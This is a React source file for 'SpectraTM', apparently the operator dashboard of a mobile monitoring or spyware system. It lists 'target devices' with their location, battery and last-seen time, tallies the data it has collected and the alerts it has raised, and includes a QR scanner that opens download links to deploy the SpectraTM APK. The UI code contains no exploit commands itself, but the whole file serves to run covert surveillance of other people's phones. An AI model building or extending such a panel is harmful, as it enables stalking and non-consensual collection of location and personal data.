import React, { useState, useEffect } from 'react';
import { Line, Bar, Doughnut } from 'react-chartjs-2';
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
} from 'chart.js';

ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement
);

const Dashboard = ({ socket, devices }) => {
  const [metrics, setMetrics] = useState({
    totalDevices: 0,
    activeDevices: 0,
    dataCollected: 0,
    alertsGenerated: 0,
    batteryAverage: 0,
    storageUsed: 0
  });

  const [activityData, setActivityData] = useState({
    labels: [],
    datasets: []
  });

  const [deviceStats, setDeviceStats] = useState({
    labels: ['Active', 'Inactive', 'Maintenance'],
    datasets: [{
      data: [0, 0, 0],
      backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
      borderWidth: 0
    }]
  });

  useEffect(() => {
    if (socket) {
      socket.on('metrics_update', (data) => {
        setMetrics(data);
      });

      socket.on('activity_data', (data) => {
        setActivityData(data);
      });

      // Request initial metrics
      socket.emit('request_metrics');
    }
  }, [socket]);

  useEffect(() => {
    if (devices.length > 0) {
      const activeCount = devices.filter(d => d.status === 'active').length;
      const inactiveCount = devices.filter(d => d.status === 'inactive').length;
      const maintenanceCount = devices.filter(d => d.status === 'maintenance').length;

      setDeviceStats({
        labels: ['Active', 'Inactive', 'Maintenance'],
        datasets: [{
          data: [activeCount, inactiveCount, maintenanceCount],
          backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
          borderWidth: 0
        }]
      });

      setMetrics(prev => ({
        ...prev,
        totalDevices: devices.length,
        activeDevices: activeCount,
        batteryAverage: Math.round(devices.reduce((acc, d) => acc + (d.battery || 0), 0) / devices.length || 0)
      }));
    }
  }, [devices]);

  const chartOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        labels: {
          color: '#ffffff'
        }
      }
    },
    scales: {
      x: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      },
      y: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      }
    }
  };

  const doughnutOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        position: 'bottom',
        labels: {
          color: '#ffffff',
          padding: 20
        }
      }
    }
  };

  return (
    <div className="dashboard fade-in">
      <div className="device-list">
        <h2>🔗 Connected Devices</h2>
        {devices.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2rem', color: '#a0a0a0' }}>
            <p>No devices connected</p>
            <p style={{ fontSize: '0.8rem', marginTop: '0.5rem' }}>
              Install SpectraTM APK on target devices to begin monitoring
            </p>
          </div>
        ) : (
          devices.map((device, index) => (
            <div key={index} className="device-item">
              <div className="device-info">
                <h3>{device.name || `Device ${device.id}`}</h3>
                <p>📱 {device.model} | 🔋 {device.battery}% | 📍 {device.location || 'Unknown'}</p>
                <p style={{ fontSize: '0.7rem', marginTop: '0.2rem' }}>
                  Last seen: {new Date(device.lastSeen).toLocaleString()}
                </p>
              </div>
              <span className={`device-status ${device.status}`}>
                {device.status === 'active' ? '🟢' : '🔴'} {device.status}
              </span>
            </div>
          ))
        )}
      </div>

      <div className="metrics-panel">
        <h2 style={{ marginBottom: '1.5rem', color: '#00ff88' }}>📊 System Metrics</h2>
        
        <div className="metrics-grid">
          <div className="metric-card">
            <span className="metric-value">{metrics.totalDevices}</span>
            <span className="metric-label">Total Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.activeDevices}</span>
            <span className="metric-label">Active Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.dataCollected / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Data Collected</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.alertsGenerated}</span>
            <span className="metric-label">Alerts Generated</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.batteryAverage}%</span>
            <span className="metric-label">Avg Battery</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.storageUsed / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Storage Used</span>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1rem' }}>
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Activity Timeline</h3>
            {activityData.datasets && activityData.datasets.length > 0 ? (
              <Line data={activityData} options={chartOptions} />
            ) : (
              <div style={{ 
                display: 'flex', 
                alignItems: 'center', 
                justifyContent: 'center', 
                height: '100%', 
                color: '#a0a0a0' 
              }}>
                No activity data available
              </div>
            )}
          </div>
          
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Device Status</h3>
            <Doughnut data={deviceStats} options={doughnutOptions} />
          </div>
        </div>

        {/* QR Code Scanner Section */}
        <QRScanner />
      </div>
    </div>
  );
};

// QR Code Scanner Component
const QRScanner = () => {
  const [isScanning, setIsScanning] = useState(false);
  const [scannedData, setScannedData] = useState(null);
  const [cameraStream, setCameraStream] = useState(null);
  const [jsQR, setJsQR] = useState(null);
  const videoRef = React.useRef(null);

  // Load jsQR dynamically
  React.useEffect(() => {
    import('jsqr').then(module => {
      setJsQR(module.default);
    }).catch(error => {
      console.error('Failed to load jsQR:', error);
    });
  }, []);

  const startScanning = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'environment',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      setCameraStream(stream);
      setIsScanning(true);
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
      alert('Camera access denied or not available');
    }
  };

  const stopScanning = () => {
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
      setCameraStream(null);
    }
    setIsScanning(false);
  };

  const processFrame = () => {
    if (!isScanning || !videoRef.current) return;

    const video = videoRef.current;
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0);
    
    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
    
    // Simple QR detection (in production, use jsQR library)
    try {
      // This is a placeholder - in real implementation, use jsQR or similar
      const qrData = detectQRCode(imageData);
      if (qrData) {
        setScannedData(qrData);
        stopScanning();
        handleQRData(qrData);
      }
    } catch (error) {
      // Continue scanning
    }

    if (isScanning) {
      requestAnimationFrame(processFrame);
    }
  };

  const detectQRCode = (imageData) => {
    if (!jsQR) return null;
    
    try {
      const code = jsQR(imageData.data, imageData.width, imageData.height, {
        inversionAttempts: "dontInvert",
      });
      return code ? code.data : null;
    } catch (error) {
      console.error('QR detection error:', error);
      return null;
    }
  };

  const handleQRData = (data) => {
    try {
      const qrPayload = JSON.parse(data);
      if (qrPayload.t === 'spectratm_deploy') {
        // Handle SpectraTM deployment QR
        alert(`✅ SpectraTM Deployment QR Detected!\n\nVersion: ${qrPayload.v}\nDownloading APK...`);
        window.open(qrPayload.d, '_blank'); // Open download URL
      } else {
        // Handle other QR codes
        alert(`ℹ️ QR Code Content:\n${data}`);
      }
    } catch (error) {
      // Not JSON, treat as plain text
      if (data.startsWith('http')) {
        alert(`🔗 URL QR Code Detected:\n${data}\n\nOpening link...`);
        window.open(data, '_blank');
      } else {
        alert(`📝 Text QR Code:\n${data}`);
      }
    }
  };

  React.useEffect(() => {
    if (isScanning) {
      processFrame();
    }
  }, [isScanning]);

  return (
    <div className="chart-container" style={{ marginTop: '1rem' }}>
      <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>📱 QR Code Scanner</h3>
      
      <div style={{ display: 'flex', gap: '1rem', alignItems: 'center', marginBottom: '1rem' }}>
        <button 
          onClick={isScanning ? stopScanning : startScanning}
          style={{
            background: isScanning ? '#ff4444' : '#00ff88',
            color: '#000',
            border: 'none',
            padding: '10px 20px',
            borderRadius: '5px',
            cursor: 'pointer',
            fontWeight: 'bold'
          }}
        >
          {isScanning ? '🛑 Stop Scanner' : '📷 Start Scanner'}
        </button>
        
        <span style={{ color: '#a0a0a0' }}>
          {isScanning ? '🔍 Scanning for QR codes...' : 'Click to scan APK deployment QR codes'}
        </span>
      </div>

      {isScanning && (
        <div style={{ 
          position: 'relative', 
          width: '100%', 
          maxWidth: '400px',
          margin: '0 auto',
          background: '#001100',
          border: '2px solid #00ff88',
          borderRadius: '10px',
          padding: '10px'
        }}>
          <video 
            ref={videoRef}
            style={{ 
              width: '100%', 
              height: 'auto',
              borderRadius: '5px'
            }}
            playsInline
            muted
          />
          <div style={{
            position: 'absolute',
            top: '50%',
            left: '50%',
            transform: 'translate(-50%, -50%)',
            border: '2px solid #00ff88',
            width: '200px',
            height: '200px',
            borderRadius: '10px',
            pointerEvents: 'none'
          }} />
        </div>
      )}

      {scannedData && (
        <div style={{ 
          background: '#001100', 
          border: '1px solid #00ff88', 
          padding: '10px',
          marginTop: '1rem',
          borderRadius: '5px'
        }}>
          <h4 style={{ color: '#00ff88', margin: '0 0 10px 0' }}>✅ QR Code Detected:</h4>
          <pre style={{ 
            color: '#ffffff', 
            fontSize: '12px',
            wordWrap: 'break-word',
            whiteSpace: 'pre-wrap'
          }}>
            {JSON.stringify(scannedData, null, 2)}
          </pre>
        </div>
      )}

      <div style={{ 
        background: '#001100', 
        border: '1px solid #555', 
        padding: '10px',
        marginTop: '1rem',
        borderRadius: '5px',
        fontSize: '14px'
      }}>
        <h4 style={{ color: '#ffaa00', margin: '0 0 10px 0' }}>💡 Instructions:</h4>
        <ul style={{ color: '#a0a0a0', margin: 0, paddingLeft: '20px' }}>
          <li>Point camera at the QR code from /spectra.apk page</li>
          <li>Keep QR code centered in the green frame</li>
          <li>Scanner will automatically detect and process the code</li>
          <li>APK download will start automatically</li>
        </ul>
      </div>
    </div>
  );
};

export default Dashboard;